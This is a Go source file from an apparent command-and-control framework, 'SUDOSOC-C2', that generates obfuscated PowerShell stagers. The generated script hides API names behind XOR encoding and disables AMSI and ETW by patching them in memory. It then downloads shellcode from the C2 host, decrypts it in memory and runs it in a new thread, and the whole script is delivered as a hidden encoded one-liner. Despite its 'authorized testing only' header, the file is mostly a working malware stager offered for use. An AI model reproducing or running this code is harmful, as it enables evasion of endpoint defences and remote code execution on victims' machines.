package generate

/*
	SUDOSOC-C2 — PowerShell Stager Generator (Empire-style)
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing and red team operations only.

	Mirrors the Empire C2 framework approach:
	  • Every build generates a UNIQUE script (random variable names, random XOR key)
	  • ALL sensitive API names encoded as XOR byte arrays — never appear as plaintext
	  • AMSI bypass via reflection + memory patch (amsiInitFailed = true)
	  • ETW bypass via NtTraceEvent patch
	  • Shellcode download + XOR decrypt in memory
	  • Process injection via P/Invoke (no files written except the PS1)
	  • Delivered as a single base64 one-liner: powershell -w h -enc <b64>
*/

import (
	crand "crypto/rand"
	"encoding/base64"
	"fmt"
	"math/rand"
	"strings"
	"unicode/utf16"
)

// PSBuildStager generates a fully obfuscated PowerShell stager for the given stage.
// Returns: (base64_oneliner, ps1_source, error)
func PSBuildStager(stageID, c2Host string, c2Port int, xorKey []byte) (string, string, error) {
	rng := rand.New(rand.NewSource(randInt64()))

	// ── Random variable names (unique per build) ──────────────────────────────
	vn := func() string { return randVarName(rng) }
	vLoad  := vn()
	vBytes := vn(); vKey   := vn(); vIdx   := vn()
	vMem   := vn(); vSize  := vn(); vOld   := vn()
	vThrd  := vn(); vWin   := vn(); vType  := vn()
	vAmsi  := vn(); vFld   := vn()
	vLib   := vn(); vProc  := vn(); vAddr  := vn()
	vSig   := vn(); vNs    := vn(); vName  := vn()

	// ── Per-script XOR key for API name obfuscation ───────────────────────────
	apiKey := byte(rng.Intn(180) + 40)

	// Encodes a string as a PS byte-array literal XOR'd with apiKey
	enc := func(s string) string {
		b := []byte(s)
		parts := make([]string, len(b))
		for i, c := range b {
			parts[i] = fmt.Sprintf("0x%02X", c^apiKey)
		}
		return fmt.Sprintf("([byte[]](0x%02X,%s) | %%{$_ -bxor 0x%02X}|%%{[char]$_}) -join ''",
			// prepend nothing — just the array
			0, strings.Join(parts, ","), apiKey)
	}
	// Shorter helper without the leading dummy byte
	e := func(s string) string {
		b := []byte(s)
		parts := make([]string, len(b))
		for i, c := range b {
			parts[i] = fmt.Sprintf("0x%02X", c^apiKey)
		}
		return fmt.Sprintf("([byte[]](%s)|%%{$_ -bxor 0x%02X}|%%{[char]$_})-join''",
			strings.Join(parts, ","), apiKey)
	}
	_ = enc

	// XOR key for payload (passed to script)
	keyLit := make([]string, len(xorKey))
	for i, b := range xorKey {
		keyLit[i] = fmt.Sprintf("0x%02X", b)
	}
	keyArr := "[byte[]](" + strings.Join(keyLit, ",") + ")"

	// ── Stage URL (also XOR'd so no plaintext IP in script) ───────────────────
	stageURL := fmt.Sprintf("http://%s:%d/api/stage/%s", c2Host, c2Port, stageID)
	urlBytes := []byte(stageURL)
	urlParts := make([]string, len(urlBytes))
	for i, b := range urlBytes {
		urlParts[i] = fmt.Sprintf("0x%02X", b^apiKey)
	}
	urlLit := fmt.Sprintf("([byte[]](%s)|%%{$_ -bxor 0x%02X}|%%{[char]$_})-join''",
		strings.Join(urlParts, ","), apiKey)

	// ── P/Invoke Add-Type signature (all API names XOR'd) ─────────────────────
	// We build the signature string at runtime from XOR'd bytes
	sigContent := fmt.Sprintf(`
[DllImport(%s)]public static extern IntPtr %s(IntPtr a,uint s,uint t,uint p);
[DllImport(%s)]public static extern bool %s(IntPtr a,UIntPtr s,uint p,out uint o);
[DllImport(%s)]public static extern IntPtr %s(IntPtr a,UIntPtr s,IntPtr f,IntPtr p,uint c,IntPtr i);
[DllImport(%s)]public static extern uint %s(IntPtr h,uint d);
[DllImport(%s)]public static extern IntPtr %s(string n);
[DllImport(%s)]public static extern IntPtr %s(IntPtr h,string n);`,
		e("kernel32"), e("VirtualAlloc"),
		e("kernel32"), e("VirtualProtect"),
		e("kernel32"), e("CreateThread"),
		e("kernel32"), e("WaitForSingleObject"),
		e("kernel32"), e("LoadLibrary"),
		e("kernel32"), e("GetProcAddress"),
	)

	nsVal   := randomAlpha(rng, 6)
	nameVal := randomAlpha(rng, 6)

	// Build the full PS script
	var sb strings.Builder

	// ── 1. Add-Type with P/Invoke stubs ───────────────────────────────────────
	fmt.Fprintf(&sb, "$%s=%s\n", vNs, `"`+nsVal+`"`)
	fmt.Fprintf(&sb, "$%s=%s\n", vName, `"`+nameVal+`"`)
	fmt.Fprintf(&sb, "$%s=@\"\n%s\n\"@\n", vSig, sigContent)
	fmt.Fprintf(&sb, "$%s=Add-Type -MemberDefinition $%s -Name $%s -Namespace $%s -PassThru\n",
		vWin, vSig, vName, vNs)

	// ── 2. AMSI bypass — patch amsiInitFailed via reflection ──────────────────
	// Build the type/field names at runtime so AMSI doesn't see the strings
	amsiUtils := e("System.Management.Automation.AmsiUtils")
	amsiField := e("amsiInitFailed")
	fmt.Fprintf(&sb, "try{\n")
	fmt.Fprintf(&sb, "  $%s=[Ref].Assembly.GetType(%s)\n", vAmsi, amsiUtils)
	fmt.Fprintf(&sb, "  $%s=$%s.GetField(%s,'NonPublic,Static')\n", vFld, vAmsi, amsiField)
	fmt.Fprintf(&sb, "  $%s.SetValue($null,$true)\n", vFld)
	fmt.Fprintf(&sb, "}catch{}\n")

	// ── 3. ETW bypass — patch NtTraceEvent to ret 0 ───────────────────────────
	etwDll  := e("ntdll.dll")
	etwFunc := e("NtTraceEvent")
	fmt.Fprintf(&sb, "try{\n")
	fmt.Fprintf(&sb, "  $%s=$%s::LoadLibrary(%s)\n", vLib, vWin, etwDll)
	fmt.Fprintf(&sb, "  $%s=$%s::GetProcAddress($%s,%s)\n", vProc, vWin, vLib, etwFunc)
	fmt.Fprintf(&sb, "  if($%s){\n", vProc)
	fmt.Fprintf(&sb, "    $%s=[UIntPtr]::new(3)\n", vSize)
	fmt.Fprintf(&sb, "    $%s=0\n", vOld)
	fmt.Fprintf(&sb, "    $%s::VirtualProtect($%s,$%s,0x40,[ref]$%s)|Out-Null\n", vWin, vProc, vSize, vOld)
	// patch bytes: 0x31=xor, 0xC0=eax, 0xC3=ret (encoded with apiKey)
	p1 := byte(0x31) ^ apiKey
	p2 := byte(0xC0) ^ apiKey
	p3 := byte(0xC3) ^ apiKey
	fmt.Fprintf(&sb, "    $%s=[byte[]](0x%02X,0x%02X,0x%02X)|%%{$_ -bxor 0x%02X}\n",
		vAddr, p1, p2, p3, apiKey)
	fmt.Fprintf(&sb, "    [Runtime.InteropServices.Marshal]::Copy([byte[]]$%s,0,$%s,3)\n", vAddr, vProc)
	fmt.Fprintf(&sb, "    $%s::VirtualProtect($%s,$%s,$%s,[ref]$%s)|Out-Null\n", vWin, vProc, vSize, vOld, vOld)
	fmt.Fprintf(&sb, "  }\n}catch{}\n")

	// ── 4. Download + XOR-decrypt the stage ───────────────────────────────────
	fmt.Fprintf(&sb, "$%s=%s\n", vLoad, urlLit)
	fmt.Fprintf(&sb, "$%s=%s\n", vKey, keyArr)
	fmt.Fprintf(&sb, "$%s=(New-Object Net.WebClient).DownloadData($%s)\n", vBytes, vLoad)
	fmt.Fprintf(&sb, "for($%s=0;$%s -lt $%s.Count;$%s++){$%s[$%s]=$%s[$%s] -bxor $%s[$%s %% $%s.Count]}\n",
		vIdx, vIdx, vBytes, vIdx, vBytes, vIdx, vBytes, vIdx, vKey, vIdx, vKey)

	// ── 5. Allocate RW, copy, protect RX, CreateThread ────────────────────────
	fmt.Fprintf(&sb, "$%s=$%s::VirtualAlloc(0,$%s.Count,0x3000,0x04)\n", vMem, vWin, vBytes)
	fmt.Fprintf(&sb, "[Runtime.InteropServices.Marshal]::Copy($%s,0,$%s,$%s.Count)\n", vBytes, vMem, vBytes)
	fmt.Fprintf(&sb, "$%s=[UIntPtr]::new($%s.Count)\n", vSize, vBytes)
	fmt.Fprintf(&sb, "$%s=0\n", vOld)
	fmt.Fprintf(&sb, "$%s::VirtualProtect($%s,$%s,0x20,[ref]$%s)|Out-Null\n", vWin, vMem, vSize, vOld)
	fmt.Fprintf(&sb, "$%s=$%s::CreateThread(0,0,$%s,0,0,0)\n", vThrd, vWin, vMem)
	fmt.Fprintf(&sb, "$%s::WaitForSingleObject($%s,0xFFFFFFFF)|Out-Null\n", vWin, vThrd)
	fmt.Fprintf(&sb, "Remove-Variable %s,%s,%s,%s,%s,%s,%s -ErrorAction SilentlyContinue\n",
		vBytes, vKey, vMem, vType, vSig, vAmsi, vFld)

	src := sb.String()

	// ── Encode as UTF-16LE base64 for powershell -enc ─────────────────────────
	b64 := psBase64(src)

	return b64, src, nil
}

// psBase64 encodes a string as UTF-16LE base64 (for powershell -enc)
func psBase64(s string) string {
	runes := utf16.Encode([]rune(s))
	buf := make([]byte, len(runes)*2)
	for i, r := range runes {
		buf[i*2] = byte(r)
		buf[i*2+1] = byte(r >> 8)
	}
	return base64.StdEncoding.EncodeToString(buf)
}

// randVarName returns a realistic-looking PowerShell variable name
func randVarName(rng *rand.Rand) string {
	prefixes := []string{"r", "s", "x", "t", "n", "d", "h", "p", "m", "k", "b"}
	p := prefixes[rng.Intn(len(prefixes))]
	return p + randomAlpha(rng, 4+rng.Intn(4))
}

func randomAlpha(rng *rand.Rand, n int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, n)
	for i := range b {
		b[i] = chars[rng.Intn(len(chars))]
	}
	return string(b)
}

// RandBytes fills b with cryptographically random bytes.
func RandBytes(b []byte) (int, error) {
	return crand.Read(b)
}

func randInt64() int64 {
	b := make([]byte, 8)
	crand.Read(b)
	var v int64
	for _, c := range b {
		v = v<<8 | int64(c)
	}
	return v
}
